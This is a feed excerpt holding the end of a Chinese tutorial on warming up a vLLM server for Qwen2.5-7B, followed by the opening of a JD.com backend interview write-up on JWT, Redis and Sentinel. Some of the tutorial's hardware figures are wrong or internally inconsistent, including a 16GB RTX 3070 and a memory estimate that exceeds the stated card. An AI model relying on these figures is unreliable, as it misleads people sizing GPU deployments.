    <span class="hljs-string">"""扩展 prompt 到目标长度（按字符数估算）"""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(base_prompt) &gt;= target_len:
        <span class="hljs-keyword">return</span> base_prompt

    <span class="hljs-comment"># 构造填充内容，让 prompt 达到目标长度</span>
    padding_text = <span class="hljs-string">"请详细展开说明，包括具体的技术细节、实现原理、优化方法、性能指标、应用场景。"</span>
    repeat_count = (target_len - <span class="hljs-built_in">len</span>(base_prompt)) // <span class="hljs-built_in">len</span>(padding_text) + <span class="hljs-number">1</span>
    padding = (padding_text * repeat_count)[:target_len - <span class="hljs-built_in">len</span>(base_prompt)]
    <span class="hljs-keyword">return</span> base_prompt + padding

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">prompt, max_tokens</span>):
    <span class="hljs-keyword">try</span>:
        t0 = time.time()
        resp = <span class="hljs-keyword">await</span> client.chat.completions.create(
            model=<span class="hljs-string">"Qwen/Qwen2.5-7B-Instruct"</span>,
            messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}],
            max_tokens=max_tokens,
            temperature=<span class="hljs-number">0.2</span>,
            stream=<span class="hljs-literal">False</span>,
        )
        dt = time.time() - t0
        preview = resp.choices[<span class="hljs-number">0</span>].message.content[:<span class="hljs-number">60</span>].replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">" "</span>)
        <span class="hljs-keyword">return</span> dt, preview
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"预热请求失败: <span class="hljs-subst">{e}</span>"</span>, file=sys.stderr)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-string">f"ERROR: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)[:<span class="hljs-number">50</span>]}</span>"</span>

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"开始预热 vLLM 服务..."</span>)
    tasks = []

    <span class="hljs-comment"># 生成不同长度的 prompt 组合</span>
    <span class="hljs-keyword">for</span> base_prompt <span class="hljs-keyword">in</span> base_prompts:
        <span class="hljs-keyword">for</span> prompt_len, max_tok <span class="hljs-keyword">in</span> length_pairs:
            <span class="hljs-comment"># 根据目标长度扩展 prompt</span>
            extended_prompt = make_prompt_with_length(base_prompt, prompt_len)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  准备长度 ~<span class="hljs-subst">{<span class="hljs-built_in">len</span>(extended_prompt)}</span> 的 prompt，max_tokens=<span class="hljs-subst">{max_tok}</span>"</span>)

            <span class="hljs-comment"># 并发 4 个相同请求，测试并发处理能力</span>
            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
                tasks.append(asyncio.create_task(send(extended_prompt, max_tok)))

    <span class="hljs-comment"># 等待所有任务完成</span>
    results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks, return_exceptions=<span class="hljs-literal">True</span>)

    <span class="hljs-comment"># 统计结果</span>
    success_count = <span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(r, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> r[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0</span>)
    error_count = <span class="hljs-built_in">len</span>(results) - success_count

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n预热完成！成功: <span class="hljs-subst">{success_count}</span>, 失败: <span class="hljs-subst">{error_count}</span>"</span>)

    <span class="hljs-comment"># 显示部分结果</span>
    <span class="hljs-keyword">for</span> i, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results[:<span class="hljs-number">10</span>]):  <span class="hljs-comment"># 只显示前10个</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(result, <span class="hljs-built_in">tuple</span>):
            dt, preview = result
            <span class="hljs-keyword">if</span> dt &gt; <span class="hljs-number">0</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[<span class="hljs-subst">{i:02d}</span>] <span class="hljs-subst">{dt:<span class="hljs-number">.3</span>f}</span>s <span class="hljs-subst">{preview!r}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[<span class="hljs-subst">{i:02d}</span>] 异常: <span class="hljs-subst">{result}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    asyncio.run(main())
</code></pre>
<p>两轮跑下来，TTFT 从 5.x s 掉到 0.7~1.x s，延迟波动也小了很多。显存紧张或担心 OOM 时，把每个 prompt 的并发从 4 改成 2。</p>
<hr/>
<h2 data-id="heading-12">⑤ 把预热“产品化”——启动即触发</h2>
<h3 data-id="heading-13">启动后自动预热</h3>
<ol>
<li>用 systemd 管 vLLM，再在 <code>ExecStartPost</code> 调用 warmup：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Service]</span>
<span class="hljs-attr">ExecStart</span>=/usr/bin/python -m vllm.entrypoints.openai.api_server \
  --model Qwen/Qwen2.5-7B-Instruct \
  --host 0.0.0.0 --port 8000 \
  --gpu-memory-utilization 0.9 \
  --max-model-len 4096

<span class="hljs-comment"># 等待服务就绪后再执行预热</span>
<span class="hljs-attr">ExecStartPost</span>=/bin/bash -c <span class="hljs-string">'for i in {1..30}; do \
  curl -s http://127.0.0.1:8000/v1/models &amp;&amp; break || sleep 2; \
done &amp;&amp; /usr/bin/python /opt/warmup_vllm.py'</span>

<span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure
<span class="hljs-attr">RestartSec</span>=<span class="hljs-number">10</span>
</code></pre>
<ol start="2">
<li>或者在 CI/CD 的部署脚本里：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动服务后等待就绪</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"等待 vLLM 服务启动..."</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..30}; <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">if</span> curl -s http://127.0.0.1:8000/v1/models &gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"服务已就绪，开始预热"</span>
    <span class="hljs-built_in">break</span>
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">sleep</span> 2
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 执行预热脚本</span>
python warmup_vllm.py || (<span class="hljs-built_in">echo</span> <span class="hljs-string">"warmup failed"</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1)
</code></pre>
<h3 data-id="heading-14">定时保活</h3>
<p>长时间无流量，GPU 可能降频、cache 失效。用 cron 每 15 分钟打一次轻量请求：</p>
<pre><code class="hljs language-bash" lang="bash">*/15 * * * * /usr/bin/python /opt/warmup_ping.py &gt;&gt; /var/log/vllm_warm.log 2&gt;&amp;1
</code></pre>
<p><code>warmup_ping.py</code> 可以只发一条 32-token 的短请求，不影响显存。</p>
<hr/>
<h2 data-id="heading-15">⑥ vLLM 参数也要配合预热，否则可能白忙</h2>
<ul>
<li><code>--gpu-memory-utilization 0.9</code>：留 10% 余量，避免预热时 OOM</li>
<li><code>--max-model-len 4096/8192</code>：过小长 prompt 会失败，过大会撑爆显存，预热前先算好显存占用</li>
<li><code>--enforce-eager</code>：默认 False，必要时可打开便于调试内核编译</li>
<li><code>--max-num-batched-tokens</code>：在高并发场景适当放大，避免预热覆盖不到大 batch</li>
<li>多卡：<code>--tensor-parallel-size N</code>，预热脚本要真正打到所有 GPU，别只打到 rank0</li>
<li>低显存（8/12GB）量化方案：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 12GB 显存：使用 AWQ 4bit 量化</span>
python -m vllm.entrypoints.openai.api_server \
  --model TheBloke/Qwen2.5-7B-Instruct-AWQ \
  --quantization awq \
  --gpu-memory-utilization 0.85 \
  --max-model-len 2048

<span class="hljs-comment"># 8GB 显存：使用 GPTQ 4bit 量化</span>
python -m vllm.entrypoints.openai.api_server \
  --model TheBloke/Qwen2.5-7B-Instruct-GPTQ \
  --quantization gptq \
  --gpu-memory-utilization 0.8 \
  --max-model-len 1024
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-16">⑦ 观测验证：数据说话才有底气</h2>
<p><strong>对比表（RTX 3070 16GB / Qwen2.5-7B-Instruct / fp16）：</strong></p>






























<table><thead><tr><th>指标</th><th>冷启动</th><th>预热后</th></tr></thead><tbody><tr><td>TTFT（中等 prompt）</td><td>5.4s</td><td>1.1s</td></tr><tr><td>TTFT（长 prompt 1k）</td><td>6.9s</td><td>1.7s</td></tr><tr><td>P95 波动</td><td>2.6s</td><td>0.7s</td></tr><tr><td>GPU 利用率爬升时间</td><td>9s</td><td>2.3s</td></tr></tbody></table>
<blockquote>
<p>注：上述为本机实测，若硬件/驱动/模型不同，数值仅供参考，重点看“首轮 vs 次轮”的下降幅度。</p>
</blockquote>
<p><strong>监控建议：</strong></p>
<ul>
<li><code>nvidia-smi dmon -s pucvmet</code> 看功耗/显存/频率</li>
<li>vLLM 日志中的 <code>prefill</code>, <code>decode</code> latency（<code>tail -f</code> 观察）</li>
<li>简单压测：<code>hey -n 200 -c 16 http://127.0.0.1:8000/v1/chat/completions</code></li>
</ul>
<hr/>
<h2 data-id="heading-17">架构长啥样？一图概括</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    User[用户请求] --&gt; LB[LB/Nginx]
    LB --&gt; V1[vLLM 实例 1]
    LB --&gt; V2[vLLM 实例 2]
    V1 --&gt; GPU1[GPU]
    V2 --&gt; GPU2[GPU]
    subgraph Warmup &amp; Obs
        Cron[预热定时任务] --&gt; V1
        Cron --&gt; V2
        Loki[日志收集] --&gt; Grafana[监控面板]
    end
    style User fill:#e1f5fe
    style GPU1 fill:#fff3e0
    style GPU2 fill:#fff3e0
    style Grafana fill:#e8f5e9
</code></pre>
<hr/>
<h2 data-id="heading-18">快速避坑清单</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1) GPU 持久化，避免掉电重启</span>
sudo nvidia-persistenced

<span class="hljs-comment"># 2) 先确认显存足够，再设 max-model-len</span>
python - &lt;&lt;<span class="hljs-string">'PY'</span>
<span class="hljs-comment"># Qwen2.5-7B 显存需求计算</span>
model_params_gb = 7 * 2  <span class="hljs-comment"># 7B params * 2 bytes (fp16) = 14GB</span>

<span class="hljs-comment"># KV Cache 计算</span>
hidden=4096; layers=32
max_len=4096; dtype_bytes=2  <span class="hljs-comment"># fp16</span>
<span class="hljs-comment"># 每 token KV = hidden * 2 (K+V) * layers * dtype</span>
kv_per_token = hidden * 2 * layers * dtype_bytes
kv_cache_gb = kv_per_token * max_len / 1024 / 1024 / 1024

<span class="hljs-comment"># 总显存需求（预估）</span>
total_gb = model_params_gb + kv_cache_gb + 0.5  <span class="hljs-comment"># 0.5GB for activation</span>
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"模型权重: {model_params_gb:.1f} GB"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"KV Cache (max_len={max_len}): {kv_cache_gb:.1f} GB"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"激活值和其他: ~0.5 GB"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"总需求: ~{total_gb:.1f} GB"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"\n建议配置:"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"16GB 显存: --max-model-len 4096 --gpu-memory-utilization 0.9"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"24GB 显存: --max-model-len 8192 --gpu-memory-utilization 0.9"</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"12GB 显存: 使用量化版本 (AWQ/GPTQ 4bit)"</span>)
PY

<span class="hljs-comment"># 3) 预热脚本务必覆盖长 prompt + 并发</span>

<span class="hljs-comment"># 4) 如果开了 LoRA / speculative，预热也要打到对应路径</span>

<span class="hljs-comment"># 5) 观测 TTFT 改善：跑两轮 warmup，再压测</span>
</code></pre>
<hr/>
<h2 data-id="heading-19">一键可用的示例配置</h2>
<p><strong>启动命令：</strong></p>
<pre><code class="hljs language-bash" lang="bash">python -m vllm.entrypoints.openai.api_server \
  --model Qwen/Qwen2.5-7B-Instruct \
  --host 0.0.0.0 --port 8000 \
  --tensor-parallel-size 1 \
  --gpu-memory-utilization 0.9 \
  --max-model-len 4096 \
  --max-num-batched-tokens 8192
</code></pre>
<p><strong>预热脚本调用：</strong></p>
<pre><code class="hljs language-bash" lang="bash">python warmup_vllm.py
python warmup_vllm.py  <span class="hljs-comment"># 再跑一遍看 TTFT 差异</span>
</code></pre>
<p><strong>简易压测：</strong></p>
<pre><code class="hljs language-bash" lang="bash">hey -n 200 -c 16 \
  -m POST \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{"model":"Qwen/Qwen2.5-7B-Instruct","messages":[{"role":"user","content":"hello"}]}'</span> \
  http://127.0.0.1:8000/v1/chat/completions
</code></pre>
<hr/>
<h2 data-id="heading-20">此番折腾的收获</h2>
<p><strong>踩过的坑：</strong></p>
<ul>
<li>忘开 GPU 持久化，冷启动功耗/频率爬升慢</li>
<li>只预热短 prompt，结果第一条长对话仍然 3s+</li>
<li>多卡只打到 rank0，其他卡的内核没 JIT</li>
<li><code>--max-model-len</code> 估算不足，长 prompt 直接 OOM</li>
</ul>
<p><strong>值得复用的经验：</strong></p>
<ol>
<li>预热要覆盖“长短胖瘦”：长度、并发、语料类型、流式路径都要走一遍</li>
<li>预热应产品化：部署脚本/cron 内置，不靠“有人想起来就跑一下”</li>
<li>参数先算后设：KV Cache 是按 max_len 预留的，别凭感觉</li>
<li>观测闭环：TTFT、P95、GPU 频率、日志都要看，别只拍脑袋</li>
</ol>
<hr/>
<h2 data-id="heading-21">写在最后：让用户一上来就觉得“真快”</h2>
<p>vLLM 已经帮我们解决了大模型推理的绝大部分性能问题，预热则是“临门一脚”：把所有冷启动成本前置、平滑掉波动，让体验从第一条请求就拉满。</p>
<p>把这篇攻略照着做，并举一反三地运用到你的工程中，让用户从「等半天」变成「怎么这么快」。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[京东零售后端一二面，附参考答案！]]></title>    <link>https://juejin.cn/post/7581412607062016046</link>    <guid>https://juejin.cn/post/7581412607062016046</guid>    <pubDate>2025-12-09T05:39:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607062016046" data-draft-id="7581619505585143859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="京东零售后端一二面，附参考答案！"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-12-09T05:39:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JavaGuide"/> <meta itemprop="url" content="https://juejin.cn/user/166781497383294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            京东零售后端一二面，附参考答案！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781497383294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JavaGuide
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:39:40.000Z" title="Tue Dec 09 2025 05:39:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读21分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>京东今年的薪资太香了！根据网上已经爆出的薪资来看，下面是京东科技和零售后端岗位今年已经开奖的薪资情况：</p>
<ul>
<li>后端：24k * 20，北京，科技，白菜</li>
<li>后端：28k * 20，北京，科技，SP</li>
<li>后端：26k * 20，北京，零售，白菜</li>
<li>后端：（30~32）k * 20，北京，零售，SP</li>
<li>后端：（31~32）k * 20，北京，零售，SSP</li>
</ul>
<p>零售开的一般要比科技高一些，科技开的白菜价可能还要比我上面提到的 24k 低一些。</p>
<p>科技和零售都是 20 薪，其中 14 薪是 100%能拿到的，剩下 6 薪是看绩效，HR 说，70％的人能拿满 20。</p>
<p>高薪对应的是高强度，京东现在的工作强度真的挺大的，尤其是涨薪之后。</p>
<p>看到这里，肯定有同学要问了，这京东的研发岗到底怎么样？值不值得冲？别急，今天我就来跟大家分享一位读者的京东研发岗校招面经，希望能帮到大家！</p>
<h2 data-id="heading-0">项目拷打</h2>
<h3 data-id="heading-1">介绍一下你做的项目</h3>
<p>作为求职者，我们可以从哪些方案去准备项目经历的回答：</p>
<ol>
<li><strong>梳理项目全貌</strong>：
<ul>
<li><strong>一句话概括项目</strong>：用简洁的语言说清楚这个项目是做什么的（核心业务/目标）以及为什么要做（项目背景、要解决什么痛点）。</li>
<li><strong>核心功能与亮点</strong>：介绍项目的主要功能模块，特别是那些技术含量高或业务价值大的部分。</li>
<li><strong>技术架构与选型</strong>：能清晰地说明项目的整体技术架构（比如是微服务、单体？用了哪些中间件？），并解释为什么选择这些技术（技术选型的考量）。准备好可能被要求画简要架构图或解释关键模块设计。</li>
</ul>
</li>
<li><strong>明确你的角色与贡献</strong>：
<ul>
<li><strong>你的角色</strong>：清楚说明你在项目中担任的角色（比如核心开发者、模块负责人、项目经理等）。</li>
<li><strong>具体职责</strong>：你具体负责了哪些模块或任务？</li>
<li><strong>关键贡献（重中之重！）</strong>：用 STAR 法则 (Situation, Task, Action, Result) 来准备几个实际案例。重点突出你通过具体行动取得了可量化的成果或解决了关键问题，一定要具体场景，而非罗列技术。例如，“负责优化 XX 接口，通过 A、B、C 措施，将响应时间从 X 降低到 Y，提升了 Z% 的用户体验”。</li>
</ul>
</li>
<li><strong>准备解决问题的亮点案例</strong>：
<ul>
<li><strong>挖掘挑战</strong>：回忆项目中遇到的最棘手的技术难题、性能瓶颈、或者复杂的业务逻辑实现。这个在面试中很可能会问到，例如面试官会问你：“面试中遇到了什么困难？如何解决的？”。</li>
<li><strong>展现思路</strong>：详细说明你是如何分析问题（用了什么工具？怎么定位的？）、思考解决方案（考虑了哪些方案？为什么选择最终方案？）、最终如何解决的，以及结果如何。</li>
<li><strong>提炼收获</strong>：从解决这个问题的过程中，你学到了什么？技术上有什么成长？或者对业务有了更深的理解？</li>
</ul>
</li>
<li><strong>深入理解关键技术</strong>：吃透你在这个项目中用到的技术（举个例子，你的项目经历使用了 Seata 来做分布式事务，那 Seata 相关的问题你要提前准备一下吧，比如说 Seata 支持哪些配置中心、Seata 的事务分组是怎么做的、Seata 支持哪些事务模式，怎么选择？）。</li>
</ol>
<h3 data-id="heading-2">为什么用 JWT？</h3>
<p>JWT 相较于 Session 认证，主要有以下优势：</p>
<ol>
<li><strong>无状态：</strong> 服务端无需存储 Session 信息，减轻服务器压力，提高可用性和伸缩性。但也因此存在 JWT 失效不可控的缺点，需要额外处理。</li>
<li><strong>防 CSRF 攻击：</strong> JWT 通常存储在 localStorage 中，不依赖 Cookie，避免了 CSRF 攻击。但需注意 XSS 攻击风险，可通过过滤可疑字符串等方式防范。</li>
<li><strong>适合移动端：</strong> JWT 可被客户端存储，且可跨语言使用，解决了 Session 认证在移动端状态管理、兼容性和安全性上的问题。</li>
<li><strong>单点登录友好：</strong> JWT 保存在客户端，避免了 Session 认证中 Cookie 跨域等问题，更易实现单点登录。</li>
</ol>
<p>关于JWT的详细介绍，强烈推荐看看我写的这两篇文章：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fsystem-design%2Fsecurity%2Fjwt-intro.html" target="_blank" title="https://javaguide.cn/system-design/security/jwt-intro.html" ref="nofollow noopener noreferrer">JWT 基础概念详解</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fsystem-design%2Fsecurity%2Fadvantages-and-disadvantages-of-jwt.html" target="_blank" title="https://javaguide.cn/system-design/security/advantages-and-disadvantages-of-jwt.html" ref="nofollow noopener noreferrer">JWT 身份认证优缺点分析</a></li>
</ul>
<h3 data-id="heading-3">项目用 Redis 有什么用？</h3>
<p>Redis 除了可以用来缓存高频访问的数据之外，还以用来实现：</p>
<ul>
<li><strong>分布式锁</strong>：通过 Redis 来做分布式锁是一种比较常见的方式。通常情况下，我们都是基于 Redisson 来实现分布式锁。关于 Redis 实现分布式锁的详细介绍，可以看我写的这篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fy8kAflIenRpa4zIwCP_8iA" target="_blank" title="https://mp.weixin.qq.com/s/y8kAflIenRpa4zIwCP_8iA" ref="nofollow noopener noreferrer">如何基于 Redis 实现分布式锁？</a>。</li>
<li><strong>限流</strong>：一般是通过 Redis + Lua 脚本的方式来实现限流。如果不想自己写 Lua 脚本的话，也可以直接利用 Redisson 中的 <code>RRateLimiter</code> 来实现分布式限流，其底层实现就是基于 Lua 代码+令牌桶算法。</li>
<li><strong>消息队列</strong>：Redis 自带的 List 数据结构可以作为一个简单的队列使用。Redis 5.0 中增加的 Stream 类型的数据结构更加适合用来做消息队列。它比较类似于 Kafka，有主题和消费组的概念，支持消息持久化以及 ACK 机制。</li>
<li><strong>延时队列</strong>：Redisson 内置了延时队列（基于 Sorted Set 实现的）。</li>
<li><strong>分布式 Session</strong> ：利用 String 或者 Hash 数据类型保存 Session 数据，所有的服务器都可以访问。</li>
<li><strong>复杂业务场景</strong>：通过 Redis 以及 Redis 扩展（比如 Redisson）提供的数据结构，我们可以很方便地完成很多复杂的业务场景比如通过 Bitmap 统计活跃用户、通过 Sorted Set 维护排行榜。</li>
</ul>
<p>面试中，根据你项目的实际情况去回答即可！</p>
<p>更多 Redis 高频知识点和面试题总结，可以阅读笔者写的这几篇文章：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fdatabase%2Fredis%2Fredis-questions-01.html" target="_blank" title="https://javaguide.cn/database/redis/redis-questions-01.html" ref="nofollow noopener noreferrer">Redis 常见面试题总结（上）</a>（Redis 基础、应用、数据类型、持久化机制、线程模型等）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fdatabase%2Fredis%2Fredis-questions-02.html" target="_blank" title="https://javaguide.cn/database/redis/redis-questions-02.html" ref="nofollow noopener noreferrer">Redis 常见面试题总结(下)</a>（Redis 事务、性能优化、生产问题、集群、使用规范等）</li>
</ul>
<h3 data-id="heading-4">引入 Sentinel 的意义是？</h3>
<p><strong>Sentinel（哨兵）</strong> 只是 Redis 的一种运行模式 ，不提供读写服务，默认运行在 26379 端口上，依赖于 Redis 工作。Redis Sentinel 的稳定版本是在 Redis 2.8 之后发布的。</p>
<p>Redis Sentinel 实现 Redis 集群高可用，只是在主从复制实现集群的基础下，多了一个 Sentinel 角色来帮助我们监控 Redis 节点的运行状态并自动实现故障转移。</p>
<p>当 master 节点出现故障的时候， Sentinel 会帮助我们实现故障转移，自动根据一定的规则选出一个 slave 升级为 master，确保整个 Redis 系统的可用性。整个过程完全自动，不需要人工介入。</p>
